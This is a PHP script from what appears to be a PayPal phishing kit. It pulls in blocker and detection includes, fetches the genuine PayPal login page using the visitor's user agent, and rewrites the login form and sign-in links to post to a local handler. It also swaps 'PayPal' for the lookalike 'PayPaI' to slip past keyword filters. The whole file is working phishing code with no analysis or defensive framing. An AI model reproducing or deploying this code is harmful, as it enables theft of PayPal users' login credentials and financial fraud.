<?php

include('../../blocker.php');
include('../../detect.php');

if ($kode_negara == gb) {
$kode_neg = "uk";
} else {
$kode_neg = $kode_negara;
}
    $url     = "https://www.paypal.com/{$kode_neg}/cgi-bin/webscr?cmd=_login-run";

$options = array(
  'http'=>array(
    'method'=>"GET",
    'header'=>"User-Agent: ".$_SERVER['HTTP_USER_AGENT']."" // i.e. An iPad 
  )
);

$context = stream_context_create($options);

function getStr($string,$start,$end)
    {
        $str = explode($start,$string);
        $str = explode($end,$str[1]);
        return $str[0];
    }


    $result = file_get_contents($url, false, $context);


# Get Link
    $get_link = getStr($result, '<a target="blank" href="', 'webapps/mpp/preview');
    $get_form = getStr($result, '<form method="post" name="login_form" action="', '"');
    $loging   = 'webscr?cmd=_login-run&dispatch='.md5(gmdate('r'));

# Get pp home
    $view = str_replace("&#x3a;", ":", $result);
    $view = str_replace("&#x2f;", "/", $view);
    $view = str_replace("&#x3f;", "?", $view);
    $view = str_replace("&#x3d;", "=", $view);
    $view = str_replace($get_form, $loging, $view);
    $view = str_replace($get_link, "?", $view);
    $view = str_replace('https://www.paypal.com/signin', $loging, $view);
    $home = str_replace("PayPal", "PayPaI", $view);
echo $home;

exit;

?>